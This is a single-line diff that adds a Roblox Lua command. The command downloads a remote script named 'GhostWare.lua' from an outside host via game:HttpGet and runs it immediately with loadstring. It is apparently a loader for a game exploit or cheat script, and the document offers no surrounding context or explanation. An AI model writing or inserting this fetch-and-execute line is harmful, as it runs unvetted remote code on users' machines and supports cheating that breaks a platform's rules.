@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://scripts.luawl.com/hosted/4455/19170/GhostWare.lua'))()
